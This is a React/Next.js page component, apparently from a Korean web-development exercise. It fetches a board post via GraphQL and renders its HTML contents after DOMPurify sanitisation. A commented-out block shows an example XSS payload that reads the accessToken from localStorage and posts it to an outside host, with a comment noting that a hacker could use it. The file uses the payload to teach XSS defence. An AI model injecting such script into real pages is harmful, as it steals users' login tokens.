import { gql, useQuery } from "@apollo/client";
import { useRouter } from "next/router";
import Dompurify from "dompurify";

const FETCH_BOARD = gql`
    query fetchBoard($boardId: ID!) {
        fetchBoard(boardId: $boardId) {
            _id
            writer
            title
            contents
        }
    }
`;

export default function StaticRoutingMovedPage(): JSX.Element {
    const router = useRouter();

    const { data } = useQuery(FETCH_BOARD, {
        variables: { boardId: router.query.qqq },
    });

    return (
        <>
            {/* <div>{router.query.qqq}번 게시글 이동완료</div> */}
            <div>작성자 : {data?.fetchBoard?.writer}</div>
            <div>제목 : {data?.fetchBoard?.title}</div>
            {/* <div>내용 : {data?.fetchBoard?.contents}</div> */}
            {typeof window !== "undefined" && (
                <div
                    dangerouslySetInnerHTML={{
                        __html: Dompurify.sanitize(data?.fetchBoard?.contents),
                        // __html: `
                        //   <script>
                        //       const qqq = localStorage.getItem("accessToken")
                        //       axios.post("http://mybackerbacken.com/mydata", {data: qqq})
                        //   </script>
                        //   해커가 사용할 수도 있다.
                        // `
                    }}
                />
            )}
        </>
    );
}
